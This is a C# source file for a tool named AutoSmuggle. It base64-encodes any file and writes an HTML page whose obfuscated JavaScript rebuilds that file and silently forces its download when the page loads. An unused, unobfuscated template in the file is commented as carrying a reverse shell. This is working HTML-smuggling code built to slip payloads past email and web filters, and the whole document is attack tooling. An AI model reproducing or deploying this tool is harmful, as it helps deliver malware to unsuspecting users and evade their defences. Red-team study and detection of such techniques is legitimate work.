using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AutoSmuggle
{
    class Program
    {

        public static string Base64Encode(byte[] plainText)
        {
            String b64data = Convert.ToBase64String(plainText);
            return b64data;
        }
        public static string HTMLSmuggle(string b64string,string filename)
        {
            string htmlbody2 =
                "<html>\n" +
                "    <body>\n" +
                "        <script>\n" +
                " function _sd95jfi59(){var _aammdjek=['2114433GhEMeA','appendChild','msSaveOrOpenBlob','href','display:\x20none','URL','body','charCodeAt','14QZBgsE','5254620KEBQoi','revokeObjectURL','click','4HxfWET','8lrkpum','navigator','1482585iufrqA','465546GJrSJX','5606793OvErfa','style','236668rbbPCP','121280RuQkWG','octet/stream','createElement'];_sd95jfi59=function(){return _aammdjek;};return _sd95jfi59();}var _i49dk30d=_j49fnc93;(function(_dk49ckd9,_iir949fn){var _dk40r9fj=_j49fnc93,_di4ir9f9=_dk49ckd9();while(!![]){try{var _di49fij9=parseInt(_dk40r9fj(0x1cb))/0x1*(parseInt(_dk40r9fj(0x1c4))/0x2)+-parseInt(_dk40r9fj(0x1cf))/0x3+-parseInt(_dk40r9fj(0x1c5))/0x4*(-parseInt(_dk40r9fj(0x1c7))/0x5)+parseInt(_dk40r9fj(0x1c8))/0x6*(parseInt(_dk40r9fj(0x1d7))/0x7)+-parseInt(_dk40r9fj(0x1cc))/0x8+parseInt(_dk40r9fj(0x1c9))/0x9+-parseInt(_dk40r9fj(0x1c1))/0xa;if(_di49fij9===_iir949fn)break;else _di4ir9f9['push'](_di4ir9f9['shift']());}catch(_dorifk00){_di4ir9f9['push'](_di4ir9f9['shift']());}}}(_sd95jfi59,0x92438));function base64ToArrayBuffer(_ofk0094k){var _ro40ro40=_j49fnc93,_eok09k90=window['atob'](_ofk0094k),_ro4kfm5=_eok09k90['length'],_0x9b5822=new Uint8Array(_ro4kfm5);for(var _fo40ro4=0x0;_fo40ro4<_ro4kfm5;_fo40ro4++){_0x9b5822[_fo40ro4]=_eok09k90[_ro40ro40(0x1d6)](_fo40ro4);}return _0x9b5822['buffer'];}var file='"+b64string+ "',data=base64ToArrayBuffer(file),blob=new Blob([data],{'type':_i49dk30d(0x1cd)}),fileName='"+filename+"';function _j49fnc93(_dk3049dk,_do4o09dj){var _sd95jfi59e6=_sd95jfi59();return _j49fnc93=function(_j49fnc934b,_0x27de04){_j49fnc934b=_j49fnc934b-0x1c1;var _0x488a3d=_sd95jfi59e6[_j49fnc934b];return _0x488a3d;},_j49fnc93(_dk3049dk,_do4o09dj);}if(window[_i49dk30d(0x1c6)][_i49dk30d(0x1d1)])window[_i49dk30d(0x1c6)][_i49dk30d(0x1d1)](blob,fileName);else{var a=document[_i49dk30d(0x1ce)]('a');console['log'](a),document[_i49dk30d(0x1d5)][_i49dk30d(0x1d0)](a),a[_i49dk30d(0x1ca)]=_i49dk30d(0x1d3);var url=window[_i49dk30d(0x1d4)]['createObjectURL'](blob);a[_i49dk30d(0x1d2)]=url,a['download']=fileName,a[_i49dk30d(0x1c3)](),window[_i49dk30d(0x1d4)][_i49dk30d(0x1c2)](url);}\n" +
                "        </script>\n" +
                "    </body>\n" +
                "</html>";

            string htmlbody = "<!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->\n" +
                "<html>\n" +
                "    <body>\n" +
                "        <script>\n" +
                "            function base64ToArrayBuffer(base64) {\n" +
                "            var binary_string = window.atob(base64);\n" +
                "            var len = binary_string.length;\n" +
                "           " +
                "\n" +
                "            var bytes = new Uint8Array( len );\n" +
                "                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }\n" +
                "                return bytes.buffer;\n" +
                "            }\n" +
                "\n" +
                "            // 32bit simple reverse shell\n" +
                "            var file = '" +b64string+ "';\n" +
                "            var data = base64ToArrayBuffer(file);\n" +
                "            var blob = new Blob([data], {type: 'octet/stream'});\n" +
                "            var fileName = '"+filename+"';\n" +
                "            if (window.navigator.msSaveOrOpenBlob) {\n" +
                "                window.navigator.msSaveOrOpenBlob(blob,fileName);\n" +
                "            } else { \n" +
                "                var a = document.createElement('a');\n" +
                "                console.log(a);\n" +
                "                document.body.appendChild(a);\n" +
                "                a.style = 'display: none';\n" +
                "                var url = window.URL.createObjectURL(blob);\n" +
                "                a.href = url;\n" +
                "                a.download = fileName;\n" +
                "                a.click();\n" +
                "                window.URL.revokeObjectURL(url);\n" +
                "            }\n" +
                "        </script>\n" +
                "    </body>\n" +
                "</html>";
            string file = filename;
            var file2 = file.Split('.')[0];
            var file3 = file.Split('.')[1];
            System.IO.File.WriteAllText("smuggle-"+file2+".html", htmlbody2);
            return null;
        }
        public static void PrintError(string error)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(error);
            Console.ResetColor();
        }
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("[*] Trying...");
                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                if (arguments.Count < 2)
                {
                    PrintError("[-] No arguments specified. Autosmuggle <path of file to smuggle> <output of file>.");
                }

                else if (arguments.Count == 2)
                {
                    // byte[] binarypath = new byte[] { };
                    string binarypath = args[0];
                    Console.WriteLine("[+] Reading Data");
                    byte[] streamdata = System.IO.File.ReadAllBytes(binarypath);
                    string b64data = Base64Encode(streamdata);
                    Console.WriteLine("[+] Converting to Base64");
                    string file = args[1];
                    Console.WriteLine("[*] Smuggling in HTML");
                    HTMLSmuggle(b64data,file);
                    Console.WriteLine("[+] File Written to Current Directory...");


                }
            }
            catch (Exception ex)
            {
                PrintError(ex.Message);
            }
        }
    }
}